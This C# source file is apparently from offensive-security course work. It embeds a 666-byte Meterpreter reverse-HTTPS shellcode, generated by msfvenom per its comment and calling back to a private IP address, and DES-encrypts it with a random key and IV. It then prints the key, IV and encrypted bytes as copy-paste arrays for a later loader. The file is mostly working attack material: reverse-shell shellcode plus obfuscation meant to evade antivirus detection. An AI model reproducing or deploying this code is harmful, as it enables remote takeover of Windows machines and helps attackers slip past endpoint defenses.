using System;
using System.Text;
using System.IO;
using System.Security.Cryptography;

namespace DES_Shellcode
{
    class Program
    {
        public static byte[] RandomBytes(int size)
        {
            byte[] rb = new Byte[size];
            RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider();
            rng.GetBytes(rb);
            return rb;
        }

        public static string FormatByteArrayToHex(byte[] data, string varName)
        {
            StringBuilder hex = new StringBuilder(data.Length * 2);

            for (int count = 0; count < data.Length; count++)
            {
                byte b = data[count];
                if ((count + 1) == data.Length)
                {
                    // If this is the last byte don't append a comma
                    hex.AppendFormat("0x{0:x2}", b);
                }
                else
                {
                    hex.AppendFormat("0x{0:x2}, ", b);
                }

                // Let's keep the output clean so only 15 bytes are in a row
                if ((count + 1) % 15 == 0)
                {
                    hex.AppendFormat("{0}", Environment.NewLine);
                }
            }
            // Output the hex into a format we can just copy/paste for later use
            string formatted = $"byte[] {varName} = new byte[{data.Length}] {{ {Environment.NewLine}{hex} }};";
            return formatted;
        }

        public byte[] Encrypt(byte[] data, byte[] key, byte[] iv)
        {
            using (var des = DES.Create())
            {
                // 64-bit
                des.KeySize = 64;
                des.BlockSize = 64;

                des.Padding = PaddingMode.Zeros;
                des.Key = key;
                des.IV = iv;

                using (var encryptor = des.CreateEncryptor(des.Key, des.IV))
                {
                    return PerformCryptography(data, encryptor);
                }
            }
        }

        public byte[] Decrypt(byte[] data, byte[] key, byte[] iv)
        {
            using (var des = DES.Create())
            {
                des.KeySize = 64;
                des.BlockSize = 64;

                // Keep this in mind when you view your decrypted content as the size will likely be different.
                des.Padding = PaddingMode.Zeros;
                des.Key = key;
                des.IV = iv;

                using (var decryptor = des.CreateDecryptor(des.Key, des.IV))
                {
                    return PerformCryptography(data, decryptor);
                }
            }
        }

        private byte[] PerformCryptography(byte[] data, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(data, 0, data.Length);
                cryptoStream.FlushFinalBlock();
                return ms.ToArray();
            }
        }

        static void Main(string[] args)
        {
            // 8 Bytes > 64-bit
            byte[] keyBytes = RandomBytes(8);
            byte[] ivBytes = RandomBytes(8);

            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.X.X LPORT=443 EXITFUNC=thread -f csharp -v payload
            byte[] payload = new byte[666] {
            0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
            0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x51,0x48,0x8b,
            0x52,0x20,0x56,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x8b,0x72,0x50,
            0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
            0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
            0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
            0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,
            0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x4d,0x31,0xc9,0x48,
            0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x48,0x31,0xc0,0x41,0xc1,0xc9,
            0x0d,0xac,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
            0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,
            0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,
            0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,
            0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
            0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,
            0x6e,0x65,0x74,0x00,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,
            0x07,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,
            0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x00,0x00,0x00,0x00,0xff,0xd5,
            0xe8,0x0e,0x00,0x00,0x00,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x34,0x39,
            0x2e,0x37,0x34,0x00,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0xbb,0x01,0x00,0x00,
            0x4d,0x31,0xc9,0x53,0x53,0x6a,0x03,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x00,
            0x00,0x00,0x00,0xff,0xd5,0xe8,0x70,0x00,0x00,0x00,0x2f,0x57,0x7a,0x44,0x4f,
            0x62,0x4f,0x79,0x72,0x50,0x6b,0x6d,0x67,0x70,0x61,0x47,0x6e,0x77,0x63,0x39,
            0x38,0x69,0x51,0x70,0x4f,0x36,0x54,0x7a,0x69,0x4e,0x61,0x63,0x37,0x53,0x76,
            0x51,0x67,0x56,0x30,0x33,0x41,0x7a,0x44,0x4a,0x34,0x73,0x56,0x6a,0x50,0x34,
            0x6a,0x44,0x6e,0x5a,0x35,0x7a,0x37,0x64,0x5f,0x52,0x71,0x68,0x4a,0x42,0x62,
            0x5a,0x6c,0x63,0x6d,0x6a,0x36,0x62,0x37,0x68,0x5f,0x2d,0x54,0x4f,0x62,0x50,
            0x47,0x71,0x53,0x64,0x54,0x4d,0x45,0x70,0x38,0x6b,0x31,0x37,0x51,0x36,0x79,
            0x36,0x77,0x42,0x44,0x69,0x45,0x53,0x49,0x4d,0x48,0x78,0x31,0x62,0x66,0x46,
            0x76,0x00,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,
            0x00,0x32,0xa8,0x84,0x00,0x00,0x00,0x00,0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb,
            0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0x0a,0x5f,0x48,0x89,0xf1,0x6a,
            0x1f,0x5a,0x52,0x68,0x80,0x33,0x00,0x00,0x49,0x89,0xe0,0x6a,0x04,0x41,0x59,
            0x49,0xba,0x75,0x46,0x9e,0x86,0x00,0x00,0x00,0x00,0xff,0xd5,0x4d,0x31,0xc0,
            0x53,0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,0x49,0xc7,
            0xc2,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,0xc7,0xc1,0x88,
            0x13,0x00,0x00,0x49,0xba,0x44,0xf0,0x35,0xe0,0x00,0x00,0x00,0x00,0xff,0xd5,
            0x48,0xff,0xcf,0x74,0x02,0xeb,0xaa,0xe8,0x55,0x00,0x00,0x00,0x53,0x59,0x6a,
            0x40,0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x00,0x10,0x00,0x00,
            0x49,0xba,0x58,0xa4,0x53,0xe5,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0x93,0x53,
            0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0x00,0x20,
            0x00,0x00,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x00,0x00,0x00,0x00,
            0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x07,0x48,0x01,
            0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x00,0x59,0xbb,0xe0,0x1d,0x2a,
            0x0a,0x41,0x89,0xda,0xff,0xd5 };

            // Encrypt
            var crypto = new Program();
            var encBytes = crypto.Encrypt(payload, keyBytes, ivBytes);

            // Decrypt
            var decBytes = crypto.Decrypt(encBytes, keyBytes, ivBytes);

            // Format our byte array into a variable format we can use later
            string keyStr = FormatByteArrayToHex(keyBytes, "OffSec");
            string ivStr = FormatByteArrayToHex(ivBytes, "Says");
            string rawStr = FormatByteArrayToHex(payload, "Try");
            string encStr = FormatByteArrayToHex(encBytes, "Har");
            string decStr = FormatByteArrayToHex(decBytes, "der");

            // Print results
            Console.WriteLine("[*] Key:");
            Console.WriteLine(keyStr);

            Console.WriteLine("\n[*] IV:");
            Console.WriteLine(ivStr);

            Console.WriteLine("\n[*] Raw Bytes:");
            Console.WriteLine(rawStr);

            Console.WriteLine("\n[*] Encrypted Bytes");
            Console.WriteLine(encStr);

            Console.WriteLine("\n[*] Decrypted Bytes");
            Console.WriteLine(decStr + "\n");
        }
    }
}
